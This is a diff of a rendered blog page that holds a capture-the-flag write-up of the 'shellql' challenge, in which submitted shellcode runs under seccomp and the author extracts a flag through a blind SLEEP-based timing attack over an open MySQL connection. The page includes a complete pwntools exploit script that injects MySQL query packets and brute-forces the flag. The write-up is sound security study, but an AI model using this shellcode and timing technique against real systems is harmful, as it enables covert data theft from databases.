@@ -9,7 +9,7 @@
 The challenge consists of a simple PHP script that opens a MySQL connection and then feeds our input into a custom PHP extension shellme.so.
 $link = mysqli_connect(&amp;#39;localhost&amp;#39;, &amp;#39;shellql&amp;#39;, &amp;#39;shellql&amp;#39;, &amp;#39;shellql&amp;#39;);  if (isset($_POST[&amp;#39;shell&amp;#39;])) { if (strlen($_POST[&amp;#39;shell&amp;#39;]) &amp;lt;= 1000) { echo $_POST[&amp;#39;shell&amp;#39;]; shellme($_POST[&amp;#39;shell&amp;#39;]); } exit(); } The extension basically just executes $_POST[&#39;shell&#39;] as shellcode after a strict SECCOMP call, prctl(22, 1). This means that we can only use the four syscalls read, write, and exit, and sigreturn, where the latter two aren’t particularly useful.
  Disassembled innermost function of interest in shellme.so  The goal is to read the flag from the open MySQL connection.
-" /><meta name="generator" content="Hugo 0.76.0-DEV" />
+" /><meta name="generator" content="Hugo 0.88.0-DEV" />
 
 <link rel="canonical" href="//blog.vero.site/post/shellql" />
 <link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />
@@ -75,17 +75,17 @@ $link = mysqli_connect(&amp;#39;localhost&amp;#39;, &amp;#39;shellql&amp;#39;, &
 	</header>
 	<article><p>The hardest challenge of not very many I solved in this CTF. What a struggle! I have a long way to improve. It was pretty fun though. (I solved “You Already Know”, and got the essence of “ghettohackers: Throwback”, but didn’t guess the right flag format and believe I was asleep when they released the hint about it.)</p>
 <p>The challenge consists of a simple PHP script that opens a MySQL connection and then feeds our input into a custom PHP extension <code>shellme.so</code>.</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode php"><code class="sourceCode php"><a class="sourceLine" id="cb1-1" data-line-number="1"><span class="kw">$link</span> = <span class="fu">mysqli_connect</span><span class="ot">(</span><span class="st">&#39;localhost&#39;</span><span class="ot">,</span> <span class="st">&#39;shellql&#39;</span><span class="ot">,</span> <span class="st">&#39;shellql&#39;</span><span class="ot">,</span> <span class="st">&#39;shellql&#39;</span><span class="ot">);</span></a>
-<a class="sourceLine" id="cb1-2" data-line-number="2"></a>
-<a class="sourceLine" id="cb1-3" data-line-number="3"><span class="kw">if</span> <span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">]))</span></a>
-<a class="sourceLine" id="cb1-4" data-line-number="4">{</a>
-<a class="sourceLine" id="cb1-5" data-line-number="5">   <span class="kw">if</span> <span class="ot">(</span><span class="fu">strlen</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">])</span> &lt;= <span class="dv">1000</span><span class="ot">)</span></a>
-<a class="sourceLine" id="cb1-6" data-line-number="6">   {</a>
-<a class="sourceLine" id="cb1-7" data-line-number="7">      <span class="kw">echo</span> <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">];</span></a>
-<a class="sourceLine" id="cb1-8" data-line-number="8">      shellme<span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">]);</span></a>
-<a class="sourceLine" id="cb1-9" data-line-number="9">   }</a>
-<a class="sourceLine" id="cb1-10" data-line-number="10">   <span class="kw">exit</span><span class="ot">();</span></a>
-<a class="sourceLine" id="cb1-11" data-line-number="11">}</a></code></pre></div>
+<div class="sourceCode" id="cb1"><pre class="sourceCode php"><code class="sourceCode php"><a class="sourceLine" id="cb1-1" title="1"><span class="kw">$link</span> = <span class="fu">mysqli_connect</span><span class="ot">(</span><span class="st">&#39;localhost&#39;</span><span class="ot">,</span> <span class="st">&#39;shellql&#39;</span><span class="ot">,</span> <span class="st">&#39;shellql&#39;</span><span class="ot">,</span> <span class="st">&#39;shellql&#39;</span><span class="ot">);</span></a>
+<a class="sourceLine" id="cb1-2" title="2"></a>
+<a class="sourceLine" id="cb1-3" title="3"><span class="kw">if</span> <span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">]))</span></a>
+<a class="sourceLine" id="cb1-4" title="4">{</a>
+<a class="sourceLine" id="cb1-5" title="5">   <span class="kw">if</span> <span class="ot">(</span><span class="fu">strlen</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">])</span> &lt;= <span class="dv">1000</span><span class="ot">)</span></a>
+<a class="sourceLine" id="cb1-6" title="6">   {</a>
+<a class="sourceLine" id="cb1-7" title="7">      <span class="kw">echo</span> <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">];</span></a>
+<a class="sourceLine" id="cb1-8" title="8">      shellme<span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&#39;shell&#39;</span><span class="ot">]);</span></a>
+<a class="sourceLine" id="cb1-9" title="9">   }</a>
+<a class="sourceLine" id="cb1-10" title="10">   <span class="kw">exit</span><span class="ot">();</span></a>
+<a class="sourceLine" id="cb1-11" title="11">}</a></code></pre></div>
 <p>The extension basically just executes <code>$_POST['shell']</code> as shellcode after a strict SECCOMP call, <a href="http://man7.org/linux/man-pages/man2/prctl.2.html">prctl</a>(<a href="https://elixir.bootlin.com/linux/v4.16.8/source/include/uapi/linux/prctl.h#L68">22</a>, <a href="https://elixir.bootlin.com/linux/v4.1/source/include/uapi/linux/seccomp.h#L10">1</a>). This means that we can only use the four syscalls <code>read</code>, <code>write</code>, and <code>exit</code>, and <code>sigreturn</code>, where the latter two aren’t particularly useful.</p>
 <figure>
 <img src="/img/shell_this.png" alt="Disassembled innermost function of interest in shellme.so" /><figcaption>Disassembled innermost function of interest in <code>shellme.so</code></figcaption>
@@ -95,57 +95,57 @@ $link = mysqli_connect(&amp;#39;localhost&amp;#39;, &amp;#39;shellql&amp;#39;, &
 <p>The first obstacle was simply that no matter what shellcode we submitted, we got an Internal Server Error. I probably spent a few hours trying to find shellcode that wouldn’t cause an error, mostly with combinations of <code>ret</code>, as well as trying to get the extension running locally on my VM to debug, but I kept getting segmentation faults whenever I merely loaded the extension locally, even if I didn’t call it. So nothing worked and I wasn’t even sure if my shellcode was being run on the server, much less know how to submit a SQL query and get a response back.</p>
 <p>My first breakthrough occurred when I thought of sending the classic x86 infinite loop <code>\xeb\xfe</code> (<code>jmp .</code>, or short relative jump −2 bytes). When I POSTed this loop, the server took something like 15 seconds to respond, instead of the usual half a second. At last, proof that my shellcode was being executed, and the meager reassurance that if all else failed, I could use a timing attack to get my shellcode to pass information back to me. I spent some more time trying to find some way to get output back from my shellcode, but after struggling for long enough and consulting with my teammates I resigned to writing shellcode blind to execute the timing attack.</p>
 <p>In my first couple attempts, I wrote shellcode that would write a query, read the result, and then go into an infinite loop if a particular bit in the result was set. A little experimentation quickly suggested that the right filehandle was 4. It still took ages because I was hoping I could get by with extracting the response to the fixed query <code>SELECT * FROM flag</code> bit by bit, so I was manually computing the packet length and XORing with ones to get shellcode without null bytes to write that query, and then I repeated that process for a few other queries just to make sure things were working. It took me a while to recall that <code>pwntools.shellcraft</code> could help me write shellcode much more easily:</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb2-1" data-line-number="1">s <span class="op">=</span> <span class="st">&quot;</span><span class="ch">\x03</span><span class="st">&quot;</span> <span class="op">+</span> query <span class="co"># prepend COM_QUERY indicator</span></a>
-<a class="sourceLine" id="cb2-2" data-line-number="2">n <span class="op">=</span> <span class="bu">len</span>(s)</a>
-<a class="sourceLine" id="cb2-3" data-line-number="3">a <span class="op">=</span> (</a>
-<a class="sourceLine" id="cb2-4" data-line-number="4">        shellcraft.amd64.pushstr(p32(n) <span class="op">+</span> s, append_null<span class="op">=</span><span class="va">False</span>) <span class="op">+</span></a>
-<a class="sourceLine" id="cb2-5" data-line-number="5">        shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_write&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, n <span class="op">+</span> <span class="dv">4</span>) <span class="op">+</span></a>
-<a class="sourceLine" id="cb2-6" data-line-number="6">        shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_read&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, <span class="dv">64</span>))</a></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb2-1" title="1">s <span class="op">=</span> <span class="st">&quot;</span><span class="ch">\x03</span><span class="st">&quot;</span> <span class="op">+</span> query <span class="co"># prepend COM_QUERY indicator</span></a>
+<a class="sourceLine" id="cb2-2" title="2">n <span class="op">=</span> <span class="bu">len</span>(s)</a>
+<a class="sourceLine" id="cb2-3" title="3">a <span class="op">=</span> (</a>
+<a class="sourceLine" id="cb2-4" title="4">        shellcraft.amd64.pushstr(p32(n) <span class="op">+</span> s, append_null<span class="op">=</span><span class="va">False</span>) <span class="op">+</span></a>
+<a class="sourceLine" id="cb2-5" title="5">        shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_write&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, n <span class="op">+</span> <span class="dv">4</span>) <span class="op">+</span></a>
+<a class="sourceLine" id="cb2-6" title="6">        shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_read&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, <span class="dv">64</span>))</a></code></pre></div>
 <p>Eventually, though, I decided this was too slow, because the <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_query_response.html">COM_QUERY Response</a> format was daunting and I did not think I could get to the flag in a reasonable amount of time by reading, exfiltrating, and parsing bits of it at a time.</p>
 <p>I played with some other ideas for a while. I considered writing shellcode to just scan for three <code>O</code>s in a row in memory and then spit out the bits after it, instead of examining every bit of the response from the start, but this felt too hard to correctly implement while blind and I didn’t feel like trying any harder to set something up to let me locally test things. (In hindsight, <code>pwntools.shellcraft</code> has a function called <code>egghunter</code> which does exactly this, so this probably would have been feasible, but you know what they say about hindsight.) I observed that although the content of the response to my query might be fairly hard to read, the OK/error flag byte was much easier to read because it was just the fifth byte of each <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_basic_response_packets.html">response packet</a>. So, I tried to create a query that would succeed or cause an error in SQL depending on a bit of the flag. I couldn’t convincingly get this to work, but while trying this and reading about all the SQL injections in the wild, I realized that I could use the SQL function <code>SLEEP</code> and cause the time delay inside SQL.</p>
 <p>The following script is more or less what I finally used to finally get the flag, at a rate of one agonizing character every half a minute or so. In theory, my shellcode should block noticeably if the SQL takes long enough, and go into an infinite loop if the SQL response is an error so that we’d be fine even if the <code>SLEEP</code> was interrupted prematurely by something other than the <code>alarm</code> or something. For reasons I’m not sure of, this was still not particularly reliable; sometimes, even with a correct prefix, it would terminate after only one second or so. The script is also very sketchy because it currently skips checking the special characters <code>%!_</code> when it should just escape them; it would have failed if the flag contained any of these characters. But such a fix would be easy to implement, and it seemed to have no false positives and got us to a guessable flag, so here we go.</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" data-line-number="1"><span class="im">from</span> __future__ <span class="im">import</span> division, print_function</a>
-<a class="sourceLine" id="cb3-2" data-line-number="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
-<a class="sourceLine" id="cb3-3" data-line-number="3"><span class="im">import</span> requests</a>
-<a class="sourceLine" id="cb3-4" data-line-number="4"><span class="im">import</span> time</a>
-<a class="sourceLine" id="cb3-5" data-line-number="5"></a>
-<a class="sourceLine" id="cb3-6" data-line-number="6">context.arch <span class="op">=</span> <span class="st">&quot;amd64&quot;</span></a>
-<a class="sourceLine" id="cb3-7" data-line-number="7"></a>
-<a class="sourceLine" id="cb3-8" data-line-number="8"><span class="kw">def</span> run_query(s):</a>
-<a class="sourceLine" id="cb3-9" data-line-number="9">    s <span class="op">=</span> <span class="st">&quot;</span><span class="ch">\x03</span><span class="st">&quot;</span> <span class="op">+</span> s <span class="co"># prepend COM_QUERY indicator</span></a>
-<a class="sourceLine" id="cb3-10" data-line-number="10">    n <span class="op">=</span> <span class="bu">len</span>(s)</a>
-<a class="sourceLine" id="cb3-11" data-line-number="11">    a <span class="op">=</span> (</a>
-<a class="sourceLine" id="cb3-12" data-line-number="12">            shellcraft.amd64.pushstr(p32(n) <span class="op">+</span> s, append_null<span class="op">=</span><span class="va">False</span>) <span class="op">+</span></a>
-<a class="sourceLine" id="cb3-13" data-line-number="13">            shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_write&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, n <span class="op">+</span> <span class="dv">4</span>) <span class="op">+</span></a>
-<a class="sourceLine" id="cb3-14" data-line-number="14">            shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_read&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, <span class="dv">64</span>) <span class="op">+</span> <span class="st">&quot;&quot;&quot;</span></a>
-<a class="sourceLine" id="cb3-15" data-line-number="15"><span class="st">            pop rax</span></a>
-<a class="sourceLine" id="cb3-16" data-line-number="16"><span class="st">            &quot;&quot;&quot;</span> <span class="op">+</span></a>
-<a class="sourceLine" id="cb3-17" data-line-number="17">            shellcraft.amd64.mov(<span class="st">&#39;rbx&#39;</span>, <span class="bn">0xff00000000</span>) <span class="op">+</span> <span class="st">&quot;&quot;&quot;</span></a>
-<a class="sourceLine" id="cb3-18" data-line-number="18"><span class="st">            xor rax, rbx</span></a>
-<a class="sourceLine" id="cb3-19" data-line-number="19"><span class="st">            test rax, rbx</span></a>
-<a class="sourceLine" id="cb3-20" data-line-number="20"><span class="st">            jz .&quot;&quot;&quot;</span></a>
-<a class="sourceLine" id="cb3-21" data-line-number="21">            )</a>
-<a class="sourceLine" id="cb3-22" data-line-number="22">    <span class="co"># print(a)</span></a>
-<a class="sourceLine" id="cb3-23" data-line-number="23">    shellcode <span class="op">=</span> asm(a)</a>
-<a class="sourceLine" id="cb3-24" data-line-number="24">    t <span class="op">=</span> time.time()</a>
-<a class="sourceLine" id="cb3-25" data-line-number="25">    r <span class="op">=</span> requests.post(<span class="st">&#39;http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php&#39;</span>,</a>
-<a class="sourceLine" id="cb3-26" data-line-number="26">            data<span class="op">=</span>{<span class="st">&#39;shell&#39;</span>: shellcode})</a>
-<a class="sourceLine" id="cb3-27" data-line-number="27">    <span class="bu">print</span>(r.content)</a>
-<a class="sourceLine" id="cb3-28" data-line-number="28">    t2 <span class="op">=</span> time.time()</a>
-<a class="sourceLine" id="cb3-29" data-line-number="29">    <span class="bu">print</span>(t2 <span class="op">-</span> t)</a>
-<a class="sourceLine" id="cb3-30" data-line-number="30">    <span class="cf">return</span> t2 <span class="op">-</span> t</a>
-<a class="sourceLine" id="cb3-31" data-line-number="31"></a>
-<a class="sourceLine" id="cb3-32" data-line-number="32">prefix <span class="op">=</span> <span class="st">&quot;&quot;</span></a>
-<a class="sourceLine" id="cb3-33" data-line-number="33"><span class="cf">while</span> <span class="va">True</span>:</a>
-<a class="sourceLine" id="cb3-34" data-line-number="34">    <span class="cf">for</span> cc <span class="kw">in</span> <span class="bu">map</span>(<span class="bu">chr</span>, <span class="bu">range</span>(<span class="dv">32</span>, <span class="dv">127</span>)):</a>
-<a class="sourceLine" id="cb3-35" data-line-number="35">        <span class="cf">if</span> cc <span class="op">==</span> <span class="st">&quot;&#39;&quot;</span> <span class="kw">or</span> cc <span class="op">==</span> <span class="st">&quot;%&quot;</span> <span class="kw">or</span> cc <span class="op">==</span> <span class="st">&quot;_&quot;</span>: <span class="cf">continue</span></a>
-<a class="sourceLine" id="cb3-36" data-line-number="36">        cur_prefix <span class="op">=</span> prefix <span class="op">+</span> cc</a>
-<a class="sourceLine" id="cb3-37" data-line-number="37">        <span class="bu">print</span>(cur_prefix)</a>
-<a class="sourceLine" id="cb3-38" data-line-number="38">        t <span class="op">=</span> run_query(<span class="st">&quot;select if(exists(select * from flag where flag like &#39;&quot;</span> <span class="op">+</span></a>
-<a class="sourceLine" id="cb3-39" data-line-number="39">                cur_prefix <span class="op">+</span> <span class="st">&quot;%&#39;), sleep(1000), 1)&quot;</span>)</a>
-<a class="sourceLine" id="cb3-40" data-line-number="40">        <span class="cf">if</span> t <span class="op">&gt;</span> <span class="dv">2</span>:</a>
-<a class="sourceLine" id="cb3-41" data-line-number="41">            prefix <span class="op">=</span> cur_prefix</a>
-<a class="sourceLine" id="cb3-42" data-line-number="42">            <span class="cf">break</span></a></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" title="1"><span class="im">from</span> __future__ <span class="im">import</span> division, print_function</a>
+<a class="sourceLine" id="cb3-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
+<a class="sourceLine" id="cb3-3" title="3"><span class="im">import</span> requests</a>
+<a class="sourceLine" id="cb3-4" title="4"><span class="im">import</span> time</a>
+<a class="sourceLine" id="cb3-5" title="5"></a>
+<a class="sourceLine" id="cb3-6" title="6">context.arch <span class="op">=</span> <span class="st">&quot;amd64&quot;</span></a>
+<a class="sourceLine" id="cb3-7" title="7"></a>
+<a class="sourceLine" id="cb3-8" title="8"><span class="kw">def</span> run_query(s):</a>
+<a class="sourceLine" id="cb3-9" title="9">    s <span class="op">=</span> <span class="st">&quot;</span><span class="ch">\x03</span><span class="st">&quot;</span> <span class="op">+</span> s <span class="co"># prepend COM_QUERY indicator</span></a>
+<a class="sourceLine" id="cb3-10" title="10">    n <span class="op">=</span> <span class="bu">len</span>(s)</a>
+<a class="sourceLine" id="cb3-11" title="11">    a <span class="op">=</span> (</a>
+<a class="sourceLine" id="cb3-12" title="12">            shellcraft.amd64.pushstr(p32(n) <span class="op">+</span> s, append_null<span class="op">=</span><span class="va">False</span>) <span class="op">+</span></a>
+<a class="sourceLine" id="cb3-13" title="13">            shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_write&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, n <span class="op">+</span> <span class="dv">4</span>) <span class="op">+</span></a>
+<a class="sourceLine" id="cb3-14" title="14">            shellcraft.amd64.linux.syscall(<span class="st">&#39;SYS_read&#39;</span>, <span class="dv">4</span>, <span class="st">&#39;rsp&#39;</span>, <span class="dv">64</span>) <span class="op">+</span> <span class="st">&quot;&quot;&quot;</span></a>
+<a class="sourceLine" id="cb3-15" title="15"><span class="st">            pop rax</span></a>
+<a class="sourceLine" id="cb3-16" title="16"><span class="st">            &quot;&quot;&quot;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb3-17" title="17">            shellcraft.amd64.mov(<span class="st">&#39;rbx&#39;</span>, <span class="bn">0xff00000000</span>) <span class="op">+</span> <span class="st">&quot;&quot;&quot;</span></a>
+<a class="sourceLine" id="cb3-18" title="18"><span class="st">            xor rax, rbx</span></a>
+<a class="sourceLine" id="cb3-19" title="19"><span class="st">            test rax, rbx</span></a>
+<a class="sourceLine" id="cb3-20" title="20"><span class="st">            jz .&quot;&quot;&quot;</span></a>
+<a class="sourceLine" id="cb3-21" title="21">            )</a>
+<a class="sourceLine" id="cb3-22" title="22">    <span class="co"># print(a)</span></a>
+<a class="sourceLine" id="cb3-23" title="23">    shellcode <span class="op">=</span> asm(a)</a>
+<a class="sourceLine" id="cb3-24" title="24">    t <span class="op">=</span> time.time()</a>
+<a class="sourceLine" id="cb3-25" title="25">    r <span class="op">=</span> requests.post(<span class="st">&#39;http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php&#39;</span>,</a>
+<a class="sourceLine" id="cb3-26" title="26">            data<span class="op">=</span>{<span class="st">&#39;shell&#39;</span>: shellcode})</a>
+<a class="sourceLine" id="cb3-27" title="27">    <span class="bu">print</span>(r.content)</a>
+<a class="sourceLine" id="cb3-28" title="28">    t2 <span class="op">=</span> time.time()</a>
+<a class="sourceLine" id="cb3-29" title="29">    <span class="bu">print</span>(t2 <span class="op">-</span> t)</a>
+<a class="sourceLine" id="cb3-30" title="30">    <span class="cf">return</span> t2 <span class="op">-</span> t</a>
+<a class="sourceLine" id="cb3-31" title="31"></a>
+<a class="sourceLine" id="cb3-32" title="32">prefix <span class="op">=</span> <span class="st">&quot;&quot;</span></a>
+<a class="sourceLine" id="cb3-33" title="33"><span class="cf">while</span> <span class="va">True</span>:</a>
+<a class="sourceLine" id="cb3-34" title="34">    <span class="cf">for</span> cc <span class="kw">in</span> <span class="bu">map</span>(<span class="bu">chr</span>, <span class="bu">range</span>(<span class="dv">32</span>, <span class="dv">127</span>)):</a>
+<a class="sourceLine" id="cb3-35" title="35">        <span class="cf">if</span> cc <span class="op">==</span> <span class="st">&quot;&#39;&quot;</span> <span class="kw">or</span> cc <span class="op">==</span> <span class="st">&quot;%&quot;</span> <span class="kw">or</span> cc <span class="op">==</span> <span class="st">&quot;_&quot;</span>: <span class="cf">continue</span></a>
+<a class="sourceLine" id="cb3-36" title="36">        cur_prefix <span class="op">=</span> prefix <span class="op">+</span> cc</a>
+<a class="sourceLine" id="cb3-37" title="37">        <span class="bu">print</span>(cur_prefix)</a>
+<a class="sourceLine" id="cb3-38" title="38">        t <span class="op">=</span> run_query(<span class="st">&quot;select if(exists(select * from flag where flag like &#39;&quot;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb3-39" title="39">                cur_prefix <span class="op">+</span> <span class="st">&quot;%&#39;), sleep(1000), 1)&quot;</span>)</a>
+<a class="sourceLine" id="cb3-40" title="40">        <span class="cf">if</span> t <span class="op">&gt;</span> <span class="dv">2</span>:</a>
+<a class="sourceLine" id="cb3-41" title="41">            prefix <span class="op">=</span> cur_prefix</a>
+<a class="sourceLine" id="cb3-42" title="42">            <span class="cf">break</span></a></code></pre></div>
 <p>Running the script, waiting a very long time for it to spit out one character at a time while playing Kittens Game in the background, then fixing the letter cases gives us the flag:</p>
 <pre><code>OOO{shellcode and webshell is old news, get with the times my friend!}</code></pre></article>
 	<footer class="post-footer">
